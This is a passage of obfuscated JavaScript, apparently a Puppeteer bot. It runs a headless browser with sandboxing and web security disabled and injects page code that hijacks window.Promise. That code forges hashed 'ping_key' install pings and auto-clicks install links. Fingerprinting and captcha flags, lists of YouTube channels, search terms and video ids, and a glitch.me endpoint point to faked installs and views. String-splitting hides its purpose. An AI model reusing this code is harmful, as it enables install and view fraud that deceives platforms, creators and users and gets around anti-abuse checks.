                K = Q[J - (0x1139 + -0xd * 0xff + -0x443)] ^ Q[J - (0x67f * -0x1 + -0x2c4 * -0x8 + -0xf99)] ^ Q[J - (0xa * 0x1f3 + 0x2298 + -0x7 * 0x7b8)] ^ Q[J - (-0x62f + -0x22ac + 0x28eb)], Q[J] = K << -0xd6 + 0x213e + 0x229 * -0xf | K >>> 0xe6e + -0x1faa + 0x115b;
              for (J = 0x2 * -0x130d + 0xdad + -0xa9 * -0x25; J < -0xc77 + 0x1933 * 0x1 + -0xc * 0x10e; J += -0x11f1 * 0x2 + -0x20c9 + 0x44b0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x160d + -0x1 * 0x17 + 0x1629 | L >>> 0x12 * -0x142 + -0x1a5 * -0xd + -0x5 * -0x46) + (M & N | ~M & O) + P + (0x3360307 * -0xb + 0xe695 * 0xb8eb + -0x28ba27e1) + Q[J] << -0xe86 + 0x149f + -0x619 * 0x1) << -0x1 * -0x11fc + -0xd23 + -0x4d4 | P >>> -0x1930 + 0x3e * -0x3e + 0x284f) + (L & (M = M << -0x1a5e + 0x1a25 + -0x57 * -0x1 | M >>> -0xee4 * 0x1 + -0x4d0 * -0x7 + -0x12ca) | ~L & N) + O + (0x1c0bef4d * -0x2 + -0x847e0234 + -0x117185a67 * -0x1) + Q[J + (0x950 + 0x543 + 0x2ea * -0x5)] << 0x1db0 + -0x359 + -0x1a57) << 0x1f02 + -0x2207 * -0x1 + -0x4104 | O >>> -0x2e * -0x12 + -0x15 * -0x1c4 + -0xd67 * 0x3) + (P & (L = L << -0x11a7 + 0x727 * 0x3 + -0x3b0 | L >>> 0x13 * -0x203 + 0xa02 + 0x1c39) | ~P & M) + N + (0x139 * 0x5b9599 + -0x50cbd917 + -0x13c6ce35 * -0x3) + Q[J + (-0x2f9 + -0xc * 0xe1 + 0xd87)] << 0x212e + 0xa52 + -0x2b80) << 0x177b + -0x17bd + -0x47 * -0x1 | N >>> 0x1399 + 0x162 * 0x4 + -0x1906) + (O & (P = P << -0x4 * 0x643 + -0x1cf5 + 0x361f * 0x1 | P >>> -0x65 * 0x3b + -0x19cc + 0x3115) | ~O & L) + M + (0x7f03 * -0x12097 + 0x865c7050 * 0x1 + 0x6354540e) + Q[J + (0x26b1 + 0x7 * -0x85 + -0x1 * 0x230b)] << 0x13db * -0x1 + 0xc5b + 0x780) << 0x116d * -0x1 + -0x16b1 + 0x2823 | M >>> 0x1d * -0xf4 + 0x80b * -0x3 + 0x33e0) + (N & (O = O << -0x1 * -0x17e6 + -0x1b21 + 0x1 * 0x359 | O >>> -0x1307 + -0x217e + 0x3487) | ~N & P) + L + (-0x75d13658 + 0x86022079 + -0x26b * -0x1ebc68) + Q[J + (0x1 * 0x11ae + -0xc5e * -0x1 + -0x1e08)] << -0x8ef + -0xb * -0x1c8 + -0xaa9, N = N << 0x1c24 + -0x70 * 0x4e + 0x61a | N >>> 0xd69 + -0x5 * -0x211 + 0x1c * -0xd9;
              for (; J < -0xb7 * 0x3 + -0x2 * 0x52c + -0xca5 * -0x1; J += 0x8fe * 0x3 + 0x21f7 + -0x3cec)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x21ec + -0x3 * 0xa3b + -0x336 | L >>> -0x1 * -0xb6c + -0x121f * 0x2 + 0x18ed * 0x1) + (M ^ N ^ O) + P + (0x2 * -0x196a40ad + -0x3 * -0x1d5d945b + -0x33307a6 * -0x17) + Q[J] << 0x22ed + 0xcd6 + -0x2fc3 * 0x1) << -0x5 * -0x107 + 0xca1 + 0xb * -0x19d | P >>> -0x7 * 0x304 + -0x23f4 + 0x392b * 0x1) + (L ^ (M = M << -0x1 * -0x1395 + 0x2649 + 0x1ce * -0x20 | M >>> -0x237 + 0x14f9 + -0x60 * 0x32) ^ N) + O + (0x37c1f72f * -0x2 + -0x25ba * 0x53009 + 0x57 * 0x4ce351f) + Q[J + (0x1 * 0x2182 + -0x25cf + 0x44e)] << -0x7c * -0x25 + -0x1baf * -0x1 + -0x1d3 * 0x19) << 0x39 * 0x2d + -0xe * 0x277 + 0x1 * 0x1882 | O >>> -0x13 * -0xe4 + 0x840 + -0x117 * 0x17) + (P ^ (L = L << -0x59e + -0xab0 + 0x106c | L >>> 0x1337 * 0x1 + -0x997 + -0x99e) ^ M) + N + (-0x1 * 0xb83d652d + -0x1cf161 * 0x535 + 0x1bdcc2ee3) + Q[J + (0x58c + 0x1e1 * 0x9 + -0x1 * 0x1673)] << -0x1 * -0xecf + -0x129 * 0x8 + -0x587) << -0x9ef + 0x1af * 0x2 + 0x696 | N >>> 0x18 * 0x62 + -0x1bc5 + 0x12b0) + (O ^ (P = P << -0x580 + 0xd * 0x279 + -0x1a87 | P >>> -0x158f + 0x9 * -0x2ab + 0x4 * 0xb65) ^ L) + M + (0x19124b4b + -0x5 * -0x297b82cf + -0x79a1edb5) + Q[J + (0x257 * -0xf + -0x1c39 * 0x1 + 0x1 * 0x3f55)] << 0x9a * -0x1e + 0x2452 + -0x1246) << -0x1612 + 0x2592 + -0x529 * 0x3 | M >>> 0x219a + 0x15f3 + -0x3772) + (N ^ (O = O << 0x530 + -0x1b5e + 0x164c | O >>> -0x1018 * 0x1 + 0x266b + 0x1651 * -0x1) ^ P) + L + (0xb2ea7cd2 * 0x1 + 0x34b * 0x423217 + -0x11e0b82ee) + Q[J + (-0x1727 + -0x3dd * -0x1 + 0x134e)] << -0x260e + 0x171 * 0x2 + 0x232c, N = N << 0x1135 + 0x70 * -0x1 + -0x31 * 0x57 | N >>> 0x25f9 * 0x1 + 0x92e + 0x3 * -0xfb7;
              for (; J < -0x863 + -0x477 + 0xd16; J += -0x1 * -0x21e3 + -0xedd + -0x1301)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1bcb * 0x1 + 0x25b0 + -0x9e0 | L >>> 0x219 * -0x1 + -0x1 * 0x761 + 0x995) + (M & N | M & O | N & O) + P - (-0xdfad7631 + -0x8b02583f + -0x4 * -0x76e50465) + Q[J] << -0x12a * 0x1 + 0x1 * -0x1b5 + -0x1 * -0x2df) << 0x5dd + -0x335 * 0x1 + 0x2d * -0xf | P >>> 0xcf6 + -0x18e * -0x5 + -0x1 * 0x14a1) + (L & (M = M << -0x1ae0 + -0x1a5 + 0x1ca3 | M >>> -0x93b + 0x23bc + -0x1a7f) | L & N | M & N) + O - (-0x1faf * 0x60926 + 0x85d7ebb5 + 0xaa483269) + Q[J + (0x115 * -0x23 + 0x3ad * 0x2 + 0x1e86)] << 0x19bb * 0x1 + 0x39a + -0x1d55) << -0x1ca * 0x11 + -0xbed * 0x1 + 0x2a5c * 0x1 | O >>> 0x2138 + -0x161a + -0xb03) + (P & (L = L << -0x4ab * -0x8 + 0x749 + -0x35 * 0xd7 | L >>> 0x22b1 + -0x1 * -0x58a + -0x5bf * 0x7) | P & M | L & M) + N - (-0x3d888a52 + -0x8f41f9c7 + 0x8e09 * 0x23c95) + Q[J + (0x105b + -0x3 * -0x92b + 0xe9e * -0x3)] << 0x4c1 + -0x1f00 + 0x1a3f) << -0x197c + 0x14b3 * -0x1 + 0x2e34 | N >>> -0x1 * 0x2ba + 0x186a + -0x1595) + (O & (P = P << -0x1c41 * 0x1 + 0x15 * -0x133 + 0x358e | P >>> -0x3f * -0x77 + 0x5e3 + -0x2 * 0x1195) | O & L | P & L) + M - (0x59a5d0ca + -0xbc8e1893 * -0x1 + 0x1 * -0xa54fa639) + Q[J + (0x15a + 0x3 * 0x95b + -0x1d68)] << 0x65 * -0x51 + -0x2 * -0xf9e + 0xb9) << -0x262f + 0x9b2 + 0x1 * 0x1c82 | M >>> -0xe85 + -0x526 * 0x2 + 0x122 * 0x16) + (N & (O = O << -0xd95 + -0x2687 + -0x776 * -0x7 | O >>> -0x3 * -0x649 + -0x15c3 + 0x2ea) | N & P | O & P) + L - (-0x533847d1 + -0x6020d90a + 0x1243d63ff) + Q[J + (-0x1 * -0xc5f + -0xb * 0xb + -0xbe2)] << -0x1b01 + 0x37c + 0x1 * 0x1785, N = N << -0x2465 + 0xd * -0x1bc + -0x48b * -0xd | N >>> -0x1bab + 0x1 * -0x8ef + -0x61a * -0x6;
              for (; J < 0x669 * -0x3 + 0x1b20 + -0x795; J += 0x1e39 * -0x1 + 0x6db + -0x1763 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x217 + 0xd * 0xa1 + -0x611 * 0x1 | L >>> -0x1 * 0x181d + -0x1c46 + 0x347e) + (M ^ N ^ O) + P - (0x5ba681d4 + 0x2f6fcc4a * -0x1 + 0x96688a0) + Q[J] << -0x840 + 0x6d + 0x7d3 * 0x1) << -0x132b + 0x911 + 0xa1f | P >>> 0xddd + -0x26e6 + 0x1924) + (L ^ (M = M << 0x1a70 + -0x25e1 * -0x1 + 0x1 * -0x4033 | M >>> 0x20a2 + -0x466 * -0x7 + 0x1fb5 * -0x2) ^ N) + O - (0x56b114c0 + 0x3fc4d869 + -0x60d8aeff) + Q[J + (0x1a57 * -0x1 + -0x4 * -0x163 + 0x533 * 0x4)] << 0x1bf7 * -0x1 + 0x2e * 0x2 + 0x25 * 0xbf) << -0x1d89 * 0x1 + 0x26 * 0x42 + -0x9 * -0x232 | O >>> 0xfdd + -0x12d5 + -0x1 * -0x313) + (P ^ (L = L << 0xd80 + 0x22aa + -0x19a * 0x1e | L >>> -0x1959 + 0x2384 + -0xa29) ^ M) + N - (-0x24 * 0xdd4a7d + 0x4 * 0x3a768db + 0x1 * 0x461e1452) + Q[J + (0x2 * 0xf25 + -0x1d * 0x17 + 0x1 * -0x1bad)] << -0x1d2 * -0xf + -0x13eb * -0x1 + -0x2f39) << -0x1 * -0x1a3f + -0x917 + -0x1123 | N >>> 0xe50 + 0x26cd + -0x2 * 0x1a81) + (O ^ (P = P << -0x13cd + -0x1 * -0x269f + -0x13 * 0xfc | P >>> -0x212f + -0x1 * 0x15c3 + 0x1 * 0x36f4) ^ L) + M - (0x574eea0c + -0x1ea626eb + -0x9 * 0x569cff) + Q[J + (-0x98f + -0x1 * -0xf49 + 0x85 * -0xb)] << 0x22a6 + 0x387 * 0x3 + -0x2d3b) << 0x7b6 * 0x2 + -0x1 * -0x1609 + 0x1 * -0x2570 | M >>> -0x170e + -0x87e + 0x1fa7) + (N ^ (O = O << 0x2018 + 0xd73 * -0x1 + 0x117 * -0x11 | O >>> 0xdf6 + 0x202d * -0x1 + 0x1239) ^ P) + L - (-0x4 * -0x745db9f + 0x32dc1521 * 0x2 + -0xa * 0x7b83c42) + Q[J + (-0x1665 + 0x567 * 0x1 + 0x2 * 0x881)] << 0x13d * -0x7 + 0x1b29 + -0x127e, N = N << 0x111b + 0x1aff + -0x2bfc | N >>> -0x234a + 0xe * 0x95 + -0x5 * -0x56e;
              this['h0'] = this['h0'] + L << -0x8b6 + 0x324 * -0x2 + 0xefe, this['h1'] = this['h1'] + M << 0x1 * -0x21b9 + 0x29 * 0x69 + -0x8 * -0x21d, this['h2'] = this['h2'] + N << 0x3d * -0x2f + -0x1 * -0x2167 + -0xe * 0x196, this['h3'] = this['h3'] + O << 0x80c + 0x1 * 0x15e2 + -0x1dee, this['h4'] = this['h4'] + P << 0x1 * 0xabd + -0x16c0 + 0xc03;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xe13 + -0xb14 * -0x1 + -0x109 * -0x3 & 0x11f0 + 0x1b9d + 0x12 * -0x287] + w[J >> 0x1 * 0x232 + 0x1aa * 0x11 + -0x1e64 * 0x1 & 0x1669 * 0x1 + 0xa9 * -0xd + 0x3 * -0x497] + w[J >> -0x2bd * -0xd + 0x1 * 0x156b + -0x38f0 & 0x3ee + -0xc6e * -0x1 + -0x27 * 0x6b] + w[J >> -0xf1 * -0x25 + 0x4de + -0x27a3 & 0xf4f + -0x1766 + 0x826] + w[J >> 0x42f * -0x3 + 0x15b5 * 0x1 + -0x91c & -0x232 * -0x4 + -0x53 * -0x6b + -0x2b6a] + w[J >> 0x1 * -0x1c8f + 0x23d0 + 0x739 * -0x1 & 0x9 * -0x17 + -0x16da + 0x17b8] + w[J >> 0x7 * -0xeb + -0x83 + -0x37a * -0x2 & 0x93 + 0xc99 * 0x1 + -0xd1d] + w[0x989 * -0x1 + 0xaa7 + -0x10f & J] + w[K >> 0xea2 * -0x2 + 0x123 * -0xd + 0x2c27 & 0x1c3c + 0x1a24 + -0x3 * 0x121b] + w[K >> 0x2 * 0x852 + -0x10f2 * -0x2 + 0x10d0 * -0x3 & -0x1 * 0x160e + -0x4e4 * 0x3 + -0x49 * -0x81] + w[K >> -0xd85 + -0x1577 + 0x4 * 0x8c4 & -0x1 * -0xb6 + 0x1 * -0x1adf + -0x1a38 * -0x1] + w[K >> 0x3d7 * -0x3 + -0xfff + 0x1b94 & 0x1da6 + 0x266f + -0x4406] + w[K >> -0x17cb * -0x1 + -0x1 * 0x2383 + 0xc * 0xfb & -0x4 * -0x50a + -0x1d * 0xa9 + -0x1 * 0xf4] + w[K >> -0x9 * 0x2a5 + -0x3 * 0x399 + 0x22a0 & -0x1d53 + 0xb95 + 0x1f * 0x93] + w[K >> -0x13d3 + -0x1 * 0x17e7 + 0x2bbe & 0x20ef * 0x1 + -0x8d + -0x2053] + w[0x1195 + 0x8d9 + 0x9d * -0x2b & K] + w[L >> -0x2123 + -0x1 * -0x2273 + -0x134 & -0x2ef * 0x1 + 0x149 * 0x1a + -0x1e6c] + w[L >> 0x604 + -0xea0 + 0x8b4 * 0x1 & -0x4b * 0x19 + 0x6a3 * -0x1 + 0xe05] + w[L >> 0x2d * -0xa5 + -0x141c + 0x3131 & -0x253e + -0xb * 0x1fd + 0x7 * 0x874] + w[L >> -0x4ea + -0xdcc * 0x2 + 0x2092 & 0xb57 + -0x1bca * 0x1 + 0x1082] + w[L >> -0x32d * -0x2 + -0xbf * -0x1 + -0x5 * 0x169 & -0x224 * -0xe + 0x269d + -0x4486] + w[L >> -0x2456 + -0x1f2f + -0x438d * -0x1 & 0x40 * -0x98 + 0x1a17 + -0x4 * -0x2fe] + w[L >> -0x9ed + -0x8 * -0x2b3 + -0xba7 * 0x1 & -0x13d8 + -0xd56 + 0x213d] + w[-0x2 * 0x1028 + -0x12ab * 0x1 + 0x330a & L] + w[M >> -0x2 * 0xf8e + -0x65 * 0x42 + -0x2ba * -0x15 & 0x5b * -0x2 + 0x7 * 0x2a4 + -0x11b7] + w[M >> 0x160e + -0x1 * -0x1716 + -0x2d0c & 0x1 * -0x181d + -0x2 * 0xdfa + 0x8b * 0x60] + w[M >> 0x2 * -0x48b + 0x1de4 * 0x1 + -0x14ba & -0x185 * -0x1 + -0x7 * 0x13 + -0x1 * 0xf1] + w[M >> 0x1bb4 + 0x2 * -0x73c + 0x232 * -0x6 & 0xaee + 0xdb0 + -0x188f] + w[M >> -0xd48 + 0x193f + -0x9 * 0x153 & 0x16ba + -0x248c * 0x1 + 0xde1] + w[M >> 0xe2f * 0x1 + 0x53 * 0x31 + -0x1e0a & 0xe5 * -0x5 + -0x87b + 0xd03] + w[M >> -0x16e0 + -0x3 * 0x262 + 0x1e0a & 0xb * 0x113 + 0x9a3 * -0x4 + 0x1aca] + w[-0x102 + 0x1dc1 + -0x90 * 0x33 & M] + w[N >> -0x2413 + 0x1d3 * 0xb + 0x101e & 0x47 * 0x71 + -0x2d * 0xd1 + 0x575] + w[N >> 0x101 * 0x17 + -0x8a8 + -0xe57 & 0x1168 + -0xf68 + 0x47 * -0x7] + w[N >> -0x11 * 0x1f5 + -0x1361 + -0x18d * -0x22 & -0x2 * 0xd29 + -0x11fc * 0x1 + -0x115 * -0x29] + w[N >> -0x86 * 0xe + -0x803 * -0x4 + -0x18a8 & 0x1830 + 0x172c + -0x2f4d * 0x1] + w[N >> -0x5 * -0x2ff + 0x1ded + -0xae * 0x42 & 0x47 * 0x79 + 0x57 * 0x20 + 0x14 * -0x238] + w[N >> -0x1 * -0x1d16 + 0x10d3 + -0x105 * 0x2d & -0x5c * -0x26 + 0x1fd0 + -0x2d69] + w[N >> -0x2475 + 0x123b + 0x123e * 0x1 & 0x2af + -0x525 + 0x285 * 0x1] + w[-0x1e08 + 0x21b2 + -0x1 * 0x39b & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1959 + 0x8 * -0x391 + 0x347 * 0x1 & -0x4 * 0x7f + 0x2127 + -0x78b * 0x4,
                J >> -0x60d * 0x3 + 0x6df * -0x1 + 0x1916 & -0x212d + 0x4 * -0x60f + 0x3a68,
                J >> -0x1 * 0x247d + 0x106f + 0x1 * 0x1416 & 0x943 + -0x7d9 * 0x4 + 0x1720,
                -0x971 + 0x7f + 0x9f1 & J,
                K >> -0x6a * 0xa + 0x2 * -0xcc7 + 0x4f7 * 0x6 & -0x1c87 + -0xf69 + -0x2cef * -0x1,
                K >> 0x14fe + -0x87a + -0x1 * 0xc74 & 0x588 * -0x1 + 0x1c3a + 0x15b3 * -0x1,
                K >> -0x1 * 0x329 + -0x17f5 + 0x1b26 & 0x31 * 0x6b + -0xffb * -0x2 + -0x3372,
                -0x1b * -0x66 + -0xa * -0x1a1 + -0x1a0d & K,
                L >> 0x153c + -0x10 * -0x14b + -0x29d4 & -0x9 * 0x1dd + 0x3 * 0x6c5 + -0x7 * 0x5d,
                L >> 0x1af * -0x5 + -0x16ed * 0x1 + 0x1f68 & -0x144d + -0x17ad + 0x2cf9,
                L >> -0x1 * 0x236e + -0x14f * 0x1 + -0x24c5 * -0x1 & -0x2 * 0x4bd + -0x2017 + 0x2a90,
                0x23e * -0xb + -0x1777 + 0x3120 & L,
                M >> -0x480 + -0x2302 + 0x13cd * 0x2 & -0x1a9d + -0x1519 + 0x30b5,
                M >> 0x15ee + -0x1a93 + 0x4b5 & 0x1 * -0x2312 + -0xc37 + 0xce * 0x3c,
                M >> 0x10d + 0x6 * 0x124 + -0x7dd & 0x97b + 0x4 * -0x61c + -0x1 * -0xff4,
                -0x1c75 + 0x10 * -0x53 + 0x22a4 & M,
                N >> -0x192e * 0x1 + 0x147 * 0x3 + 0x1571 & 0x1 * 0x1c27 + -0x1568 + 0x17 * -0x40,
                N >> -0x114a + -0x36a * -0x1 + -0xdf0 * -0x1 & -0x160f + -0x1 * 0x260f + 0x1bf * 0x23,
                N >> -0x1506 + -0xd2e + 0x272 * 0xe & 0x546 + 0xb29 + -0xf70,
                0xd27 + 0xdfd + -0x1a25 & N
              ];
            }
            [U(0x18, '0Zn7') + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1042 * 0x1 + -0x235f + 0x33b5), (K = new DataView(J))['setUint32'](-0x14a7 + 0x5 * -0x545 + 0x178 * 0x20, this['h0']), K['setUint32'](0x1c0f * -0x1 + -0xd51 + 0x2964, this['h1']), K['setUint32'](-0x20d6 + 0x1124 + -0x3d * -0x42, this['h2']), K['setUint32'](-0x216a + -0x1 * -0x18df + -0x3 * -0x2dd, this['h3']), K['setUint32'](0xf45 + 0x6e + 0xfa3 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xbad * 0x3 + 0x2 * 0x9c2 + -0x368b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x790 + 0x17b * -0xe + -0x151 * -0xa;
            J[0x1e45 + -0x138e + 0x1 * -0xab7]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xfcd + -0x73 + 0x1040] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0xc9 * 0x24 + 0x144d + 0x7f8), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1021 + 0x1f87 + -0x2fa7;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x43 * 0x43 + 0x2612 + -0xead), Promise['resolve'](-0x10ab * 0x1 + -0x18 * -0x19e + -0x1624);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x7e4 + 0x1dd0 + 0x15ec * -0x1; j < 0x122 * -0x1e + -0x9 * 0x2cd + 0x3b32; j++)
    i();
}
const NETWORK_PATIENCE = 0x118 * 0x2c + 0x107c + -0x215c + (0x930 + 0x137c + -0x5 * 0x364) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x4 * 0x478 + -0x1 * 0x2187 + 0x336a) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    V(0xc) + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xc * -0x19a + 0x655 + 0xce3; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + V(0x1c) + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x213f + -0x129a * 0x1 + 0x33e3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x256e + -0x8d * 0x29 + -0x3c0d * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + W(0x15) + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x17 * 0x169 + -0xbef + 0x1 * -0x147d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
